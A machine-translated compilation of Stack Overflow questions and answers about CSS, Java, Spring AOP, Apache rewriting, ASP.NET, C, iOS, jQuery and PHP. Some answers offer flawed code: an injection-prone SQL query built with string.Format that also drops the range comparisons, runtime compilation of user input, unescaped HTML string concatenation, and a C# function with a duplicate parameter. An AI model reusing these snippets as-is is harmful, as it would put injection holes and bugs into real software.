# html - 为什么我的内联块 div 只有一个有文本时没有对齐？

> ID：13548168
> 
> 赞同：38
> 
> 时间：2012-11-25T04:08:37.470
> 
> 标签：html, alignment, css

> *现场页面[在这里](http://jsbin.com/oqodol/1/edit)。*

鉴于此 HTML 页面：

```
section[role=main] {
  margin: 1em;
  width: 95%;
  border: 1px solid #999;
}

section[role=main] article {
  width: 40%;
  height: 180px;
  margin: 1em;
  display: inline-block;
  border: 1px solid black;
}
```

```
<section role="main">
  <article>Java</article>
  <article></article>
</section>

<section role="main">
  <article>Java</article>
  <article>JavaScript</article>
</section>
```

我希望我的两篇文章都是对齐的，但正如下面的屏幕截图所示，只有当我的两篇文章都有文本时，`<article>`元素才会居中对齐：

![对齐问题](../Images/31e903624a5eb2c86090040e6e41206d.png)

任何想法是什么导致了这种行为以及如何解决？

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2012-11-25T04:15:12.823

添加：

```
vertical-align: bottom; 
```

你的第二条规则应该使它起作用。显然，没有文本的内联块被渲染为内联图像或其他内容，并且这些元素的垂直对齐不正确，因此强制它们与底部对齐可以解决问题。

来源：[没有文本的 inline-block 元素呈现方式不同](https://stackoverflow.com/questions/4053575/css-inline-block-element-with-no-text-renders-differently)

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2012-11-25T11:46:23.637

这是 CSS 中“基线”垂直对齐的结果。来自[CSS 2.1 规范，第 10.8 节行高计算：'line-height' 和 'vertical-align' 属性](http://www.w3.org/TR/CSS2/visudet.html#propdef-vertical-align)

> ## 基线
> 
> > 将框的基线与父框的基线对齐。**如果框没有基线，则将底部边距边缘与父项的基线对齐。**（我的重点）

因为内联块的默认对齐方式是“基线”，除非它被覆盖，否则此规则适用。当文本放入 inline-block 时，该文本将为 inline-block 创建基线，并且第一个（非粗体）句子适用。

当 inline-block 中没有文本时，它没有基线，因此第二个（粗体）句子适用。

在此处的 JSFiddle 中：http: [//jsfiddle.net/WjCb9/1/](http://jsfiddle.net/WjCb9/1/)我已从您的示例中删除了`margin:1em`正在创建（至少对我而言）误导性错觉的内容，并添加了文本`baseline`以显示包含框的基线是。基线位于单词“baseline”的底部，因此您可以看到空的内联块的底部边距边缘与上述 CSS 规则所要求的父基线对齐。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-11-25T04:18:53.633

[这个](https://stackoverflow.com/questions/7967497/content-of-div-affects-horizontal-alignment-inline-block-issue)的克隆

为文章添加垂直对齐：

```
section[role=main] article { 
  ...
  vertical-align: middle;
} 
```

[http://jsbin.com/oqodol/6/edit](http://jsbin.com/oqodol/6/edit)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-25T04:17:29.737

`inline-block`元素由它们的`text-align`父元素定位。

如果块内没有文本，则没有要对齐的内容。

你可以通过使用和浮动来解决这个问题`display: block;`，或者我的建议是插入一个不间断的、零宽度的空间和伪元素：

```
section[role=main] article:before {
  content: "\2060";
} 
```

[演示](http://jsbin.com/oqodol/2/)

# java - 移位以获得余数

> ID：13548172
> 
> 赞同：13
> 
> 时间：2012-11-25T04:08:56.667
> 
> 标签：java, bit-manipulation, number-theory

我想知道如何通过仅使用位移或按位运算符将一个整数除以另一个整数（均为正数）来获得余数。不应使用运算符或运算符`/`。`%`

例如，为了在除数为以下形式时获得余数，`2^k`以下操作产生余数。

`m = Remainder`

`n = The number`

`d = The divisor`

`m = n & ( d - 1 )`

然而，这种方法只有在`d`是 形式时才有效`2^k`。我想知道一种类似的方法来处理非`2`. 我目前正在解决一个问题，`programming challenges`并希望采用这种方法来减少程序执行时间

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T23:08:29.360

任何不使用运算符的答案`%`都将是一个效率较低的答案，但是，如果您绝对不能使用运算符，那么一种解决方案是使用循环从 n 中重复减去 d：

```
m = n;
while (m >= d)
{
  m -= d;
} 
```

假设你的整数是 32 位的，那么你可以考虑一个优化的版本，我们从 n 中删除 d 的倍数：

```
m = n;
for (i = 31; i >= 0; i--)
{
  di = d << i;
  if (di > 0 && m >= di) m -= di;
} 
```

这个例子，假设整数是有符号的并监视溢出，即测试`di > 0`.

# java - 当我尝试使用切入点和通配符表达式创建 Bean 时，为什么会出现错误？

> ID：13548173
> 
> 赞同：0
> 
> 时间：2012-11-25T04:09:02.993
> 
> 标签：java, xml, spring-aop, pointcuts

当我练习 **Spring Tutorial 28 - Pointcuts and Wildcard Expressions**时，我遇到了以下问题：

```
线程“main”org.springframework.beans.factory.BeanCreationException 中的异常：
在类路径资源中创建名称为“三角形”的 bean 时出错
[springPointcuts.xml]：bean初始化失败；嵌套异常是
java.lang.IllegalArgumentException: ::0 处的错误找不到引用
切入点 allGetters

```

您将在下面看到我的代码，非常感谢您为我的问题提供的解决方案。

LoggingAspectPointcuts ：

```
package org.koushik.javabrains.aspect;

import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.aspectj.lang.annotation.Pointcut;

@Aspect
public class LoggingAspectPointcuts {

    @Before("allGetters()")
    public void LoggingAdvice(){
    System.out.println("Advice run.Get Method called");
    }

    @Before("allGetters()")
    public void secondAdvice() {
    System.out.println("Second Advice executed ");
    }

    @Pointcut("execution(* get*())")
    public void allGetters(){}

} 
```

AopMainWildCardPointcuts ：

```
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import org.koushik.javabrains.service.ShapeService;

public class AopMainWildCardPointcuts {

    public static void main(String[] args) {

        ApplicationContext ctx = new ClassPathXmlApplicationContext("springPointcuts.xml");

        ShapeService shapeService= (ShapeService) ctx.getBean("shapeService");
        System.out.println(shapeService.getCircle().getName());

    } 
```

springPointcuts.xml ：

```
?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:aop="http://www.springframework.org/schema/aop"
        xmlns:context="http://www.springframework.org/schema/context"
        xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
                http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.0.xsd
                http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-2.5.xsd">
    <aop:aspectj-autoproxy/>
    <bean name="triangle" class="org.koushik.javabrains.model.Triangle">
    <property name="name" value="Triangle Name"/>
    </bean>
    <bean name="circle"   class="org.koushik.javabrains.model.Circle">
    <property name="name" value="Circle Name"/>
    </bean> 

    <bean name="loggingAspectPointcuts" class="org.koushik.javabrains.aspect.LoggingAspectPointcuts"/>

</beans> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-31T05:35:12.147

我猜你可能正在使用 1.5 版本的 aspectjrt 和 aspectjweaver jars。使用任何 1.6 版本你都会得到它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T03:11:56.723

代替....

```
<aop:aspectj-autoproxy/> 
```

和 ...

```
<aop:aspectj-autoproxy>
     <aop:include name="loggingAspectPointcuts"/>
</aop:aspectj-autoproxy> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-19T02:01:59.280

尝试使用正确版本的 cglib.jar 使用 cirrect 版本 2.1_3 或最新

```
asm-3.3.1
cglib-2.2.2
aspectjrt-1.6.11
aspectweaver-1.6.11. 
```

确保使用上述罐子。

# apache - .htaccess 拒绝重定向没有文件扩展名的 URL - 直接到 404

> ID：13548174
> 
> 赞同：3
> 
> 时间：2012-11-25T04:09:37.783
> 
> 标签：apache, .htaccess, mod-rewrite, url-rewriting, clean-urls

所以我一直在修修补补。Apache`.htaccess`很好地重定向了我的 WWW 客户端（如果没有 WWW，则 301 到包含 WWW 的相同 URL），并且它正在重定向带有文件扩展名的东西（`index.html`即将重定向到`index.php`. 只有没有扩展名的 URL。它拒绝破译它们。

我当前的文件：

```
RewriteEngine On
RewriteBase /

# Clean URL
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)/?$ $1.php [NS,L,R=permanent]

# Force WWW
RewriteCond %{HTTP_HOST} !^www\.thevgc\.net$
RewriteRule ^(.*)/?$ http://www.thevgc.net/$1 [NS,L,R=permanent] 
```

我整晚都在试图解决这个问题。`mod_rewrite`已启用，我必须`/etc/apache2/mods-enabled/rewrite.conf`在实际制作文件之前创建一个符号链接，该文件包括以下内容：

```
RewriteEngine On 
```

对我的这个困境有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:42:15.643

所以！我找到了我的问题的答案。看起来如果你运行命令`a2dismod negotiation`它会神奇地开始工作，或者至少在我的情况下是这样。问题解决了，案件结案，线程完成。谜团已经解开了。

# c# - 如何在配置的数据列表内的选择查询中申请循环？

> ID：13548177
> 
> 赞同：0
> 
> 时间：2012-11-25T04:10:03.180
> 
> 标签：c#, asp.net, sql-server-2008

我创建了一个数据列表

```
GridLines="Both" RepeatDirection="Horizontal" BorderColor="Black" 
                    BorderStyle="None" CellPadding="5" CellSpacing="1" RepeatColumns="6"> 
```

我还创建了数据库，其中它们是带有 productid 的列，这是我的表的主键，因此在此我将它们插入数据列表中的项目插入到水平列中，（增加 productid 的值）并作为其限制超过 6 个新行被创建。但我每次只想要 12 个项目，即只有 2 行。

我在页面的页脚模板中添加了两个链接按钮。我希望当我单击下一个按钮时，项目显示从产品 id = 13 到 24 的计数，依此类推，直到 count(n)。

我已经用 SqlDataSource1 配置了我的数据列表，并且想使用这样的查询语句

```
 SelectCommand="SELECT * FROM Products where ProductId&gt;=n and ProductId&lt;=m order by [Sports Name]" 
```

我在页面加载时声明了 m=1 和 n=12 但是当我运行我的页面时出现以下错误

```
Invalid column name 'n'.
Invalid column name 'm'.

Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. 

Exception Details: System.Data.SqlClient.SqlException: Invalid column name 'n'.
Invalid column name 'm'. 
```

现在请帮助我在我的项目中进行这种类型的编码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:14:13.453

试试 string.Format

```
SelectCommand = string.Format("SELECT * FROM Products where ProductId={0} and ProductId={1} order by [Sports Name]", n, m); 
```

# c# - 如何计算变量的值？

> ID：13548179
> 
> 赞同：1
> 
> 时间：2012-11-25T04:10:13.227
> 
> 标签：c#, winforms

我需要知道如何使用一个变量来计算方程，并让它计算并输出所述变量的值。方程的例子。

2900 = 1 * T * ((52 + 6) / 12)

我需要程序获取所有值并给我“T”的值。任何和所有的帮助将不胜感激:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:18:16.893

如果方程式相同，则只有参数发生变化-然后将其重新排列为变量。

如果整个方程是用户输入，那么它会变得很快（“2*cos(log(x^3)) = - e^tg(x)”）并且没有灵丹妙药。您可以做的最简单的事情是在运行时评估它（例如使用[NCalc](http://ncalc.codeplex.com/)）并“暴力破解”解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T04:26:01.197

首先将方程重新排列为 T=....

```
2900 = 1 * T * ((52 + 6) / 12) 
```

变成（例如）

```
T = 2900/(52 + 6) * 12 / 1 
```

接下来用变量替换数字

```
T = a/(b + c) * d / e 
```

然后你写一个函数来计算给定 ae 的 T

```
double T(double a, double b, double b, double c, double d, double e) {
 return  a/(b + c) * d / e;
} 
```

然后你像这样使用它

```
double T = T(2900, 52, 6, 12, 1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T06:33:59.350

这是一个肮脏的解决方案，`CSharpCodeProvider`用于将方程编译为代码，然后使用简单的二进制搜索来搜索 T 值。

```
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Linq;
using System.Reflection;

namespace EquationSolver
{
    public class EquationSolver
    {
        MethodInfo meth;
        double ExpectedResult;
        public EquationSolver(string equation)
        {
        var codeProvider = new CSharpCodeProvider();            
        var splitted = equation.Split(new[] {'='});

        ExpectedResult = double.Parse(splitted[0]);

        var SourceString = "using System; namespace EquationSolver { public static class Eq { public static double Solve(double T) { return "+
            splitted[1] + ";}}}";

        System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
        parameters.GenerateInMemory = true;

        CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, SourceString);

        var cls = results.CompiledAssembly.GetType("EquationSolver.Eq");
        meth = cls.GetMethod("Solve", BindingFlags.Static | BindingFlags.Public);

    }

    public double Evaluate(double T)
    {            
        return (double)meth.Invoke(null, new[] { (object)T });
    }

    public double SearchT(double start, double end, double tolerance)
    {            
        do
        {
            var results = Enumerable.Range(0, 4).Select(x => start + (end - start) / 3 * x).Select(x => new Tuple<double, double>(
                x, Evaluate(x))).ToArray();
            foreach (var result in results)
            {
                if (Math.Abs(result.Item2 - ExpectedResult) <= tolerance)
                {
                    return result.Item1;
                }
            }
            if (Math.Abs(results[2].Item2 - ExpectedResult) > Math.Abs(results[1].Item2 - ExpectedResult))
            {
                end -= (end - start) / 3;                    
            }
            else
            {
                start += (end - start) / 3;
            }
        } while (true);
    }
  }

} 
```

就目前而言，它有严重的限制：

1.  必须首先说明预期结果（在您的示例中为 2900）。
2.  要求解的方程，必须在等号之后说明，只有一个变量，命名为 T。T 本身可以存在于方程中的多个位置。
3.  由于代码已编译，您可以使用 .NET 数学函数，但这也意味着输入可能被滥用，比任何 SQL 注入都要糟糕。
4.  是二分查找。因此，如果您的方程不是简单的线性方程，它将失败。
5.  由于整数运算总是产生整数，并且没有小数点的普通数字被 C# 解析为整数，如果你想要双精度结果，数字必须明确设置为这样（在你的等式中，至少 52、6 或 12 之一必须是用小数点书写，例如 52.0)

用法示例：

```
var eq = new EquationSolver( "2900 = 1 * T * ((52 + 6.0) / 12)");
var r = eq.SearchT(int.MinValue,int.MaxValue,0.001); 
```

# android - 关于 AOSP 下载和构建少量查询

> ID：13548181
> 
> 赞同：0
> 
> 时间：2012-11-25T04:10:24.740
> 
> 标签：android, open-source, android-source, rom

我的机器上有 Lubuntu 12.10。为编译 AOSP 安装了所有必要的软件。我有带有版本的安卓手机。2.3 我没有找到任何ROM版本。4.0 所以决定自己编译。我正在遵循[本指南](http://source.android.com/source/initializing.html)。

我运行的最后一个命令是：

```
$ repo init -u https://android.googlesource.com/platform/manifest -b android-4.0.4_r2.1
$ repo sync 
```

现在已经超过 1 天了，它仍然只是同步。下载速度约为 50 kbps。所以我的问题 1：是为了编译到 AOSP android-4.0.4_r2.1 有没有其他方法可以跳过不必要的文件并只下载 4.0 必要的文件？

[问题 2：我在这里](http://source.android.com/source/building-kernels.html)找到了一个仅用于构建内核的链接。因此，如果我遵循本指南，它将与我运行的 repo sync 相同，因为我指定了 -b android-4.0.4_r2.1 什么是仅用于 AOSP 4.0 的更快下载方式以及构建它的任何特定指南？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:35:34.287

您应该已经阅读了 AOSP 下载页面上的警告，如果您的下载速度约为 50kb/s，则可能需要**很长时间**（〜几天？）来下载构建 AOSP 所需的大约 10GB 的不同文件。

此外，如果您没有 Google Nexus 设备，您构建的映像很可能无法在您的设备上使用。为手机中的特定硬件添加支持需要**大量修改。**

当然，没有人可以禁止您下载源代码和构建映像，但我强烈建议您不要这样做，因为在您的情况下，这基本上是浪费时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-02T09:35:42.340

终于找到了适用于 Karbonn A7 的 ICS。这人给它做了一个教程。这是更新2。 [教程在这里](http://iamrainwalker.wordpress.com/2012/12/28/symphony-w25-ktouch-w650-mobistar-s01-karbonn-a7-ics-rom-update-2)。

# software-distribution - 为什么我们不能编写一个同时在 mac 和 pc 上运行的程序？

> ID：13548183
> 
> 赞同：1
> 
> 时间：2012-11-25T04:10:54.320
> 
> 标签：software-distribution

编程语言是独立于平台的，那么为什么我们不能编写一个可以同时在 PC 和 Mac 上运行的程序呢？

我想开发一个软件，我在 Mac 上，但我也希望它在 PC 上运行，是否可以开发这样的软件而不必要求用户下载一个特殊的程序来使我的程序兼容用他们的电脑？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:18:09.563

这样做的问题是大多数软件都依赖于操作系统来处理某些任务。是的，大多数编程语言都与许多平台兼容，但操作系统提供了很多支持。当软件使用操作系统时，有时称为进行系统调用。如果你想要[这里](http://en.wikipedia.org/wiki/System_call)是一些更多的信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T04:18:13.893

从理论上讲，如果您用“高级语言”编写程序，它应该可以在两个操作系统之间移植。

然而实际上，差异从一开始就开始了 - 选择的 API，它适用于一个而不适用于另一个（例如，Mac 的 BSD API 与 Win32 API 不兼容）并归结为最后一个，即可执行格式，链接器和加载器。每个操作系统都有自己的怪癖。

然后是底层架构之间的区别。以前 Mac 运行在 PowerPC 架构和摩托罗拉架构上，而 PC 使用 Intel。自从 Mac 改用 Intel 以来，一直在尝试在 Apple 内部制作跨平台的可执行文件。大多数尝试都失败了。

但是，有一种方法可以解决您的问题。您可以使用 Python 等非常高级的语言进行编码，然后将您的 Python 代码分发给您的 PC 朋友。（但请记住，您需要在 PC 朋友的计算机中安装 Python 解释器才能运行您的程序）。我已经成功地将 Python 程序从 Mac 移植到 PC，代码更改为 0，有时只需要 2-4% 的代码更改。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-03T15:02:28.660

对的，这是可能的。但这很棘手。你需要：

*   使用跨平台语言（这是简单的部分，许多语言在不同的平台上运行）
*   避免使用任何特定于平台的功能（通常不会太难，但需要测试）
*   确保您拥有所有依赖项的跨平台库（很难！）

特别是由于库问题，跨平台工作的选项很少。您的最佳选择可能是：

*   **一种 JVM 语言**（如 Java、Scala 或 Clojure）——因为 JVM 从特定于平台的特性中抽象出来，所以纯 Java 应用程序和库可以在任何平台上运行。因此，Java 可能拥有最好的跨平台库和工具生态系统。
*   **JavaScript** - 如果您不介意在浏览器中运行，这是一个不错的选择。有很多怪癖需要处理，但 JavaScript 是最好的跨平台选项之一，因为它无处不在。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-25T04:16:18.697

简单的答案：因为语言本身不足以使应用程序跨平台。此外，它使用的框架也必须是跨平台的，一切都需要框架：处理数据、显示事物、与硬件通信、多线程等

这通常可以做到：

*   通过选择像 Java 这样的完整解决方案，它实际上可以在两个平台上无缝运行，甚至使用相同的二进制文件
*   通过使用 C/C++ 和跨平台库，以便可以为两个平台编译相同的程序（请记住，您不能分发真正相同的二进制文件，无论如何都需要编译两个）
*   通过仅使用标准库和标准语言编写程序的逻辑，然后附加特定平台所需的任何内容来构建两个不同的库。当然，您必须尽可能多地包装，以便程序的跨平台部分不知道它

请注意，在不使用 Java 等完整解决方案的情况下开发跨平台应用程序，而不是像游戏（有很多跨平台 API）这样的微不足道的例子，这根本不是一件容易的事。特别是因为您可以构建的大多数 GUI 都是严格特定于平台的，并且依赖于它们自己的框架。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-25T04:58:43.300

如果您希望应用程序“在任何地方”运行，那么您最好的选择是 JIT 类型语言，这意味着它会在运行时（及时）针对它所在的平台进行编译。在我看来，真正突出的语言是 Java（还有其他语言，我个人不喜欢 Java）。然而，事情并不是那么简单。例如，Mac 计算机上的 Window 具有 PC 上的 Window 所没有的部分和功能，反之亦然。其他操作系统甚至没有 Windows 或任何类似的东西，但仍然运行 Java，例如 Android 或 iOS 或无数 Linux 发行版。这只是一个非常基本的例子，它变得更加猎兔犬。真正构建一个任何人都可以在任何设备上使用的应用程序的最佳方式是基于网络。

教训是，如果这么简单，很多人就不会有工作，也永远不会那么简单，事情总是会进步和变化，并不是每个人都想像其他人一样用他们的操作系统做同样的事情. 给猫剥皮的方法有一百万种，在操作系统中实现某些东西的方法还有很多。

# c - C：计数`新行`直到达到双倍空格

> ID：13548185
> 
> 赞同：0
> 
> 时间：2012-11-25T04:11:11.607
> 
> 标签：c, scanf, fgetc

基本上我试图从一个看起来像的文件中读取一个“块”数据

```
000000000
000000001
000100000
100000000

000000000
000000000
000000000 
```

上面的示例将转换为两个数据块。第一个是 4 行高，第二个是 3 行高。

双空格分隔“*块*”。

这是我要阅读的代码，直到遇到双倍空格。*（这会读取第一个循环，然后我会使用它`fseek`来读取我想读取的任何其他块 - 不过在这个问题中并不重要）*

```
while(!endofblock){
  firstchar = fgetc(fptr); //read the first character
    if(firstchar == '\n'){ 
       if(fgetc(fptr) == '\n'){ //if its newline AND newline
          endofblock = 1; //end of block is reached, loops break
       }else{  //if its just one new line
          *h = *h + 1; //increment h (height), a pointer passed from elsewhere
       }
    }

  if(feof(fptr)){ 
    endofblock = 1; 
  }
} 
```

这在大多数情况下都可以正常工作 - 但在某些复杂的无法解释的情况下它不起作用。另外，它非常臃肿和凌乱。

有没有一种更整洁、更好的方法来计算数量`new line`并在达到时停止计算`double new line`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:51:52.550

使用`getline`功能：

```
char *line = NULL;
size_t linecap = 0;
ssize_t linelen;

while ((linelen = getline(&line, &linecap, fp)) > 0) {
    if (line[0] == '\n') {
        // block ended
    }
}

free(line); 
```

# objective-c - iOS：CFRunLoopRun() 函数混淆

> ID：13548188
> 
> 赞同：2
> 
> 时间：2012-11-25T04:11:59.627
> 
> 标签：objective-c, ios, multithreading, cfrunloop

我读过关于 CFRunLoop 但仍然有点困惑。我遇到了一段我想为自己澄清的代码：

```
NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
[request setURL:[NSURL URLWithString:[NSString stringWithFormat:url]]];
[request setHTTPMethod:@"POST"];
[request setValue:@"application/xml" forHTTPHeaderField:@"Content-Type"];
[request setValue:postLength forHTTPHeaderField:@"Content-Length"];
[request setHTTPBody:postData];
[[NSURLConnection alloc]initWithRequest:request delegate:self];

CFRunLoopRun(); 
```

那么，假设这一切都在主线程上调用，它会阻塞主线程吗？还是会通过 CFRunLoopRun() 函数调用产生一个新线程？

谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-12-13T17:32:24.090

实际上有一个案例是有道理的。在创建递归运行循环时（执行该行时会发生这种情况）：

> 可以递归地运行运行循环。换句话说，您可以调用 CFRunLoopRun、CFRunLoopRunInMode 或任何 NSRunLoop 方法来从输入源或计时器的处理程序例程中启动运行循环。这样做时，您可以使用任何您想要运行嵌套运行循环的模式，包括外部运行循环使用的模式。

所以关键是做这样的事情：

```
- (NSMutableData *)serverRequest
{
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
    [request setURL:[NSURL URLWithString:[NSString stringWithFormat:url]]];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/xml" forHTTPHeaderField:@"Content-Type"];
    [request setValue:postLength forHTTPHeaderField:@"Content-Length"];
    [request setHTTPBody:postData];
    [[NSURLConnection alloc]initWithRequest:request delegate:self];

    CFRunLoopRun();
    return _returnDataFromServer;
} 
```

所以该方法`serverRequest`不会退出，直到您真正停止 RunLoop：

```
- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data {
    // Append the new data to the instance variable you declared
    [_connectionData appendData:data];

    CFRunLoopStop(CFRunLoopGetCurrent());
} 
```

我不会这样做，最好将这项工作传递给工作线程。还有其他方法可以实现相同的目标，而不是使用 Run Loop。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T04:18:38.390

假设这是从主线程调用的，实际上没有任何理由调用`CFRunLoopRun`，因为默认的运行循环应该已经在运行。

您使用的方式`NSURLConnection`不会阻塞调用线程。它*可能会*在内部产生额外的线程，但您不必真正关心这一点。`initWithRequest:delegate:`将立即返回，稍后将调用您的委托方法（当收到响应、加载数据等时）。

# jquery - jquery函数没有警告字符串

> ID：13548189
> 
> 赞同：1
> 
> 时间：2012-11-25T04:12:12.043
> 
> 标签：jquery, xml, ajax

```
$("#radio5").click(function() 
{
    document.getElementById("ti").style.display="table";
        $.ajax
        ({
            type:"GET",
            url:"inst.php",
            dataType:"xml",
            success: xmlInstructor  
        });
});

function xmlInstructor(xml)
{

    $(xml).find('Instructor').each(function()
    {

     instructorName = $(this).find('InstructorName').text();

        $("#ti").append("<tr><td>"+"<input type='button' id='instructorButton'  onclick='i_click("+instructorName+")' value='ADD' />"+"</td><td>"+instructorName+"</td></tr>");
    });         
} 
```

代码工作正常，直到这里。但我想在我无法获得的 i_click 功能上提醒instructorName。如果我传递整数，它可以工作，但不能用字符串。

```
 function i_click(instructorName)
{
    alert(instructorName);
    } 
```

无法提醒导师。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:22:39.350

这是因为字符串参数没有用引号括起来

替换这个

```
<input type='button' id='instructorButton' 
                         onclick='i_click("+instructorName+")' value='ADD' /> 
```

和

```
<input type=\"button\" id=\"instructorButton\" 
       onclick=\"i_click('" +instructorName +"')\" value=\"ADD\" /> 
```

这将解决您的问题。

# salesforce - SSO 设置页面中出现无法识别的 X.509 证书格式错误

> ID：13548191
> 
> 赞同：1
> 
> 时间：2012-11-25T04:12:27.990
> 
> 标签：salesforce, single-sign-on, openam

我尝试在 salesforce 中使用 OpenAM 配置 SSO。我已完成以下步骤。

*   配置信任圈
*   配置身份提供者
*   将 Salesforce 配置为服务提供商
*   并在 OpenAM 中下载身份提供商证书我在保存设置页面时在 Salesforce SSO 设置页面中收到以下错误

**SSO 设置页面中出现无法识别的 X.509 证书格式错误**

请帮助我在 salesforce 中使用 OpenAM 成功配置 SSO。

提前致谢...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T09:04:45.283

如果您在 OpenAM 端导出证书，您可以检查边界 'BEGIN CERTIFICATE' ... 'END CERTIFICATE' 是否在单独的行上

# c# - HTML 和 MVC C# 通过表单传递值

> ID：13548193
> 
> 赞同：1
> 
> 时间：2012-11-25T04:12:55.447
> 
> 标签：c#, asp.net-mvc, forms

我正在使用 C# 和 MVC 中的表单。

我需要将 aNameID 传递给`example.com/controlpanel/edit/{anameID}`而不是`example.com/controlpanel/edit/?a={anameID}`.

我怎样才能做到这一点？

这是我的代码：

```
<form action="http://example.com/controlpanel/edit/" method="GET">
<label for="male">Person ID #</label>
<br />
<input type="text" name="aNameID"  style="width:70px;"/>
  <input type="submit" name="submit"  />
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:21:12.510

您可以使用 jQuery 挂钩表单的提交事件，然后修改表单的操作并自己提交：

```
$("form").submit(function() {
  var $form = $(this);
  var id = $("input[name=aNameID]").val();
  var newAction = $form.attr("action") + id;
  $form.attr("action", newAction);
  $form.submit();
  return false;
}); 
```

# php - 用 PHP 列出 mysql 记录

> ID：13548194
> 
> 赞同：1
> 
> 时间：2012-11-25T04:13:03.497
> 
> 标签：php, mysql, do-while

我正在尝试从同一页面中的数据库创建两个记录列表，如下所示：

```
<?php do {   ?>
<tr>
<td><?php echo $row['name']; ?></td>
<td><?php echo $row['email']; ?></td>
</tr>
<?php } while ($row = mysql_fetch_assoc($result)); ?>

<?php do {   ?>
<div>
<h1><?php echo $row['name']; ?></h1>
<p><?php echo $row['email']; ?></p>
</div>
<?php } while ($row = mysql_fetch_assoc($result)); ?> 
```

虽然第一个循环工作正常，但第二次（创建 div）do-while 循环不返回任何数据。我应该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:16:53.997

在两个循环之间插入 a`mysql_data_seek($result, 0);`以重置结果，以便您再次读取它。

被警告，如果查询没有返回任何行，`mysql_data_seek`会给你一个警告。使用前检查是否有返回行。

另请注意，您的循环是向后的。您需要获取，*然后*显示。:P 否则，每个循环的第一次迭代将吐出一个空行。使用`while (...) { }`而不是`do { } while (...)`.

（*也*被警告，**`mysql_query`是废话。请停止使用它。拜托。为了我们所有的利益** 。mysqli 扩展做同样的事情，几乎可以相同地工作，[并且 - 与 mysql 不同 - 被积极维护](http://www.php.net/manual/en/mysqlinfo.api.choosing.php)。另外，当你终于绕过学习使用准备好的语句（*你应该学习使用准备好的语句*），mysqli有它们。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T04:15:48.650

尝试使用不同的变量命名`$result`，例如`$result1`和`$result2`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T04:17:38.837

mysql_fetch_assoc 返回一个关联数组，该数组对应于获取的行，并将内部数据指针向前移动，即在获取行时将其删除。第二次迭代不会找到行。

这应该可行，也许不是最好的方法（我一直使用 db 类）。

`$result2 = $result;`

在迭代 2 中使用`mysql_fetch_assoc($result2);`

# node.js - 如何在 Coffeescript 中实现和谐？

> ID：13548196
> 
> 赞同：6
> 
> 时间：2012-11-25T04:13:27.037
> 
> 标签：node.js, coffeescript, option, ecmascript-harmony, appjs

这是我运行我的js代码的方式：

```
node --harmony ./data/app.js 
```

现在我想转向 CoffeeScript。所以我尝试这样运行它：

```
coffee ./data/app.coffee 
```

它失败了。我怎样才能通过这个`--harmony`选项？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-25T04:20:11.980

要传递 args，您可以使用以下`--nodejs`参数：

```
coffee --nodejs --harmony ./data/app.coffee 
```

# css - CSS位置：给空间

> ID：13548212
> 
> 赞同：0
> 
> 时间：2012-11-25T04:15:54.243
> 
> 标签：css, css-position

JSFiddle 示例代码：http: [//jsfiddle.net/SUMPq/8/](http://jsfiddle.net/SUMPq/8/)

我在容器上有一些文本，代码位于 HTML 的顶部，靠近正文：

```
<div id="container">
<div id="title_content">
<h1>Heading TAG</h1><br />
<p>SOME TEXT<br />SOME TEXT<br /></p>
</div></div>
<div id="spacebox"></div> 
```

然后使用 CSS 定位，我在页面的其他部分显示内容：

```
#container{position:relative;width:860px;height:0;}
#title_content{position:relative;top:100px;left:10%;font-size:14px;} 
```

